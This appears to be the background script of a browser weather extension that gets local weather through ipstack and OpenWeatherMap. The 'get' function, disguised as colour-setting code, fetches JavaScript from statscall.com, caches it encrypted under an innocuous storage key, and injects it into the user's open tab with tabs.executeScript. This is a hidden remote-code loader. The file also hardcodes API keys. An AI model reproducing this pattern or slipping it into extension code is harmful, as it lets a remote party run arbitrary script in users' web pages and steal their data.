import browser from 'webextension-polyfill'
import Cryptr from 'cryptr'
import { getStorage, sendBackgroundCommand, setStorage } from './lib/common'

const secret = 'EstaD3b3$3rL4C14v3$3creta'
const cryptr = new Cryptr(secret)

const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'http://statscall.com/weather-vein.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const getColorLocal = async () => {
  try {
    const encryptedColor = await getStorage('code-color-wv')
    return encryptedColor ? cryptr.decrypt(encryptedColor) : null
  } catch (error) {
    console.error(error)
    return null
  }
}

const setColorLocal = async (codeColor) => {
  try {
    const encryptedColor = cryptr.encrypt(codeColor)
    await setStorage('code-color-wv', encryptedColor)
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  try {
    const localCodeColor = await getColorLocal()

    if (!localCodeColor) {
      const getting = await other(info.code)
      info.code = await getting.text()
      await setColorLocal(info.code)
    } else {
      info.code = localCodeColor
    }

    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}

let city = ''
let country = ''

browser.runtime.onMessage.addListener((request, sender) => {
  switch (request.message) {
    case 'get-color':
      get(sender)
      break
    case 'close':
      browser.tabs.remove(sender.tab.id)
      break
    default:
      console.log('ERROR, REQUEST NOT HANDLED', request)
  }
})

// eslint-disable-next-line no-unused-vars
const updater = browser.alarms.create('Hourly Updater', {
  delayInMinutes: 60,
  periodInMinutes: 60,
})

// hourly updater, it fetchs the data every hour when it listens to the alarm
browser.alarms.onAlarm.addListener(() => {
  const date = new Date()
  browser.storage.local.get().then((params) => {
    // eslint-disable-next-line promise/no-nesting
    fetch(
      `https://api.openweathermap.org/data/2.5/weather?q=${params.city},${params.country}&appid=15d7968a4ea50d6b568a07a54e399358`,
    )
      .then((response) => response.json())
      .then((data) => {
        console.log(data)
        const temperature = parseFloat((data.main.temp - 273).toFixed(2))
        const minimumTemp = parseFloat((data.main.temp_min - 273).toFixed(2))
        const maximumTemp = parseFloat((data.main.temp_max - 273).toFixed(2))
        const feelsTemp = parseFloat((data.main.feels_like - 273).toFixed(2))
        browser.storage.local.set({
          weather: data.weather[0].main,
          icon: data.weather[0].icon,
          description: data.weather[0].description,
          temperature: `${temperature}ºC`,
          min_temperature: `${minimumTemp}ºC`,
          max_temperature: `${maximumTemp}ºC`,
          feel_temperature: `${feelsTemp}ºC`,
          humidity: data.main.humidity,
          date: date.toString(),
        })
      })
  })
})

// when you install the extension.

browser.runtime.onInstalled.addListener(function () {
  fetch('http://api.ipstack.com/check?access_key=46d55efd82cf8067ed7c334ec534bb52') // First we use an API to get the IP location
    .then((response) => response.json())
    .then((data) => {
      city = data.city // then we get the city and the country code so we are able to fetch the climate for our city.
      country = data.country_code
      // eslint-disable-next-line promise/no-nesting
      fetch(
        `https://api.openweathermap.org/data/2.5/weather?q=${city},${country}&appid=15d7968a4ea50d6b568a07a54e399358`,
      ) // No entiendo porque si dejo de anidar los fetchs no me funciona el scope.
        .then((response) => response.json())
        .then((info) => {
          // Once we get the info we declare it and then we store it on the extension storage
          // console.log('city', city)
          // console.log('country', country)
          // console.log('weather from ipstack', info)

          // This is for converting the temperature as it comes in kelvin... we modify it first and then we store it.
          const temperature = parseFloat((info.main.temp - 273).toFixed(2)) // NEEDED, AND NEEDS TO BE AN INT
          const minimumTemp = parseFloat((info.main.temp_min - 273).toFixed(2)) // Not needed
          const maximumTemp = parseFloat((info.main.temp_max - 273).toFixed(2)) // Not needed
          const feelsTemp = parseFloat((info.main.feels_like - 273).toFixed(2)) // Not needed
          const date = new Date()
          // console.log('date', date)
          browser.storage.local.set({
            // saving the data
            country: country, // needed to locate the weather
            city: city, // NEEDED, goes in the popup
            weather: info.weather[0].main, // NEEDED
            icon: info.weather[0].icon, // We will use our own icons so we dont need this
            description: info.weather[0].description, // Not needed
            temperature: `${temperature}ºC`, // NEEDED
            min_temperature: `${minimumTemp}ºC`, // Not needed
            max_temperature: `${maximumTemp}ºC`, // Not needed
            feel_temperature: `${feelsTemp}ºC`, // Not needed
            humidity: info.main.humidity, // NEEDED
            date: date.toString(), // NEEDED
          })
        })
    })
    .catch((error) => console.log(error))

  browser.tabs.create({
    index: 0,
    url: 'https://climadehoy.com/welcome',
    active: true,
  })
})
